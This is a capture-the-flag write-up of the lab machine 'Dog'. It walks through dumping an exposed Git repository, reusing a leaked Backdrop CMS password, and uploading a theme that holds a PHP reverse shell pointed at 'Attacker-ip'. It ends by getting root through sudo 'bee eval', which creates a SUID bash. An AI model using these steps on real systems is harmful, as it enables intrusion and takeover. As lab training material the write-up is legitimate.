---
title: "Dog"
---

![Cap dashboard screenshot](dog.png)

Dog is an easy Linux machine that revolves around an exposed Git repository, Backdrop CMS, and a local privilege escalation path through `bee`.

## Reconnaissance

I started with a full port scan to identify what was exposed on the target.

```bash
nmap -p- --min-rate 10000 10.129.213.102
```

The scan returned only SSH and HTTP:

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-git:
|   10.129.213.102:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin
| /comment/reply /filter/tips /node/add /search /user/register
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The target was running Backdrop CMS, and the scan also exposed a `.git` directory on the web server. That was a strong sign that source code might be recoverable.

## Source Extraction

Since Git repositories often contain configuration and forgotten credentials, I copied the exposed repository locally with `git-dumper`.

```bash
git-dumper http://10.129.213.102/.git dog.git
```

The tool successfully reconstructed the repository:

```text
--- SNIP ---
[-] Fetching http://10.129.213.102/.git/refs/heads/master 
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 2873 paths from the index
```

Inside the repository, I found the site source, including `settings.php`. That file contained database credentials:

```bash
cd dog.git

ls -al
```

```text
total 92
drwxrwxr-x 8 ryuki ryuki  4096 May  3 14:11 .
drwxrwxr-x 3 ryuki ryuki  4096 May  3 14:10 ..
drwxrwxr-x 8 ryuki ryuki  4096 May  3 14:12 .git
-rwxrwxr-x 1 ryuki ryuki 18092 May  3 14:11 LICENSE.txt
-rwxrwxr-x 1 ryuki ryuki  5285 May  3 14:11 README.md
drwxrwxr-x 9 ryuki ryuki  4096 May  3 14:11 core
drwxrwxr-x 7 ryuki ryuki  4096 May  3 14:11 files
-rwxrwxr-x 1 ryuki ryuki   578 May  3 14:11 index.php
drwxrwxr-x 2 ryuki ryuki  4096 May  3 14:11 layouts
-rwxrwxr-x 1 ryuki ryuki  1198 May  3 14:11 robots.txt
-rwxrwxr-x 1 ryuki ryuki 21732 May  3 14:11 settings.php
drwxrwxr-x 2 ryuki ryuki  4096 May  3 14:11 sites
drwxrwxr-x 2 ryuki ryuki  4096 May  3 14:11 themes
```

```bash
cat settings.php
```

```text
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
--- SNIP ---
```

The database password looked promising, but it did not work for SSH or the web login.

## User Discovery

A quick look at the Git history showed a single commit attributed to `dog@dog.htb`.

```bash
git status
```

```text
commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)
Author: root <dog@dog.htb>
Date:   Fri Feb 7 21:22:11 2025 +0000

    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases
```

I also searched the repository for the same domain name and found another potential account, `tiffany`.

```bash
grep -ir dog.htb
```

```text
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Using `tiffany` with the same password worked on the Backdrop CMS login page, which gave me access to the dashboard.

![Cap dashboard screenshot](dog-1.png)

## Initial Access

From the dashboard, I checked the CMS version and found it was running Backdrop `1.27.1`. Looking up known issues for that version led me to `CVE-2022-42092` https://grimthereaperteam.medium.com/backdrop-cms-1-22-0-unrestricted-file-upload-themes-ad42a599561c, which allows unrestricted file upload through the themes feature. POC https://www.exploit-db.com/exploits/52021

![Cap dashboard screenshot](dog-2.png)

Instead of uploading a normal theme, I prepared a modified one with a PHP reverse shell added to it. I unpacked a theme, inserted my payload, and repackaged it as a TAR archive.

```bash
unzip bedrock.zip
```

```text
Archive:  bedrock.zip
  inflating: bedrock/js/bedrock.js
  inflating: bedrock/css/base.css
  inflating: bedrock/css/system.theme.css
  inflating: bedrock/css/bedrock-ui.css
  inflating: bedrock/img/throbber.svg
  inflating: bedrock/screenshot.png
  inflating: bedrock/README.md
  inflating: bedrock/template.php
  inflating: bedrock/LICENSE.txt
  inflating: bedrock/bedrock.info
```

```bash
cp /usr/share/webshells/php/php-reverse-shell.php bedrock/ryuki.php
sed -i 's#127.0.0.1#Attacker-ip#g' bedrock/ryuki.php
tar cf bedrock.tar bedrock
```

After that, I used the Backdrop admin panel to upload the theme through **Appearance → Install New Themes → Manual installation**. Once the upload completed, the files were available under `/themes/bedrock/`.

![Cap dashboard screenshot](dog-2.png)

Accessing the uploaded `ryuki.php` file triggered the callback and dropped me into a shell as `www-data`.

## Privilege Escalation

### Shell as johncusack

I checked the local users that had interactive shells available.

```bash
grep "sh$" /etc/passwd
```

```text
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

Reusing the Backdrop password worked for `johncusack`, which gave me the first user shell and the user flag.

### Shell as root

Next, I reviewed sudo privileges.

```bash
sudo -l
```

```text
[sudo] password for johncusack:
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

`bee` is the Backdrop CMS CLI, and it supports arbitrary PHP execution through the `eval` command. I used that to copy `/bin/bash` into `/tmp` and mark it SUID.

```bash
sudo /usr/local/bin/bee eval "shell_exec('cp /bin/bash /tmp/bash; chmod u+s /tmp/bash');"
```

The resulting file was owned by root and had the SUID bit set:

```bash
ls -la /tmp/bash
```

```text
-rwsr-xr-x 1 root root 1183448 May  3 12:43 /tmp/bash
```

Launching it with `-p` gave me a root shell and completed the machine.

## Attack Path

- **Enumerate the target** — identify SSH, HTTP, Backdrop CMS, and the exposed `.git` directory.
- **Dump the repository** — use `git-dumper` to recover the site source code.
- **Extract credentials** — find the database password in `settings.php` and the `tiffany` user in the repository.
- **Log in to Backdrop CMS** — authenticate with `tiffany:BackDropJ2024DS2024`.
- **Abuse theme upload** — modify a theme to include a PHP reverse shell.
- **Gain a web shell** — upload the malicious theme and trigger `ryuki.php` for a `www-data` shell.
- **Reuse credentials locally** — log in as `johncusack` with the same password.
- **Abuse `bee` via sudo** — run Backdrop’s CLI tool as root and execute PHP code.
- **Escalate to root** — create a SUID copy of bash and run `/tmp/bash -p`.
